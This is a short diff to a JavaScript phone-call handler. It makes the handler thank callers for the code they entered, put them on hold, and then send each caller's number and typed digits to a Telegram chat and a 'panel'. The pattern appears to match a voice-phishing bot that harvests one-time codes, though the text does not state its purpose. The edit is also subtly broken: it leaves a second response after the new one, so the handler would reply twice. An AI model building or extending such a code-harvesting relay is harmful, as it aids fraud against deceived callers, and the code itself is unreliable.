@@ -196,6 +196,21 @@ callStart=callStart||Date.now()
 
 log("Code received")
 
+// RESPOND TO CALLER FIRST (FAST)
+
+res.type("text/xml")
+res.send(`
+<Response>
+<Say voice="${assistants[settings.assistant]}">
+Thank you. Your code has been received.
+</Say>
+<Redirect>${BASE_URL}/hold</Redirect>
+</Response>
+`)
+
+// TELEGRAM AFTER RESPONSE
+setTimeout(async()=>{
+
 await tgSend(`📞 CODE RECEIVED
 
 Caller: ${caller}
@@ -211,6 +226,7 @@ Code: ${digits}`,[
 
 await updatePanel()
 
+},0)
 res.type("text/xml")
 res.send(`
 <Response>
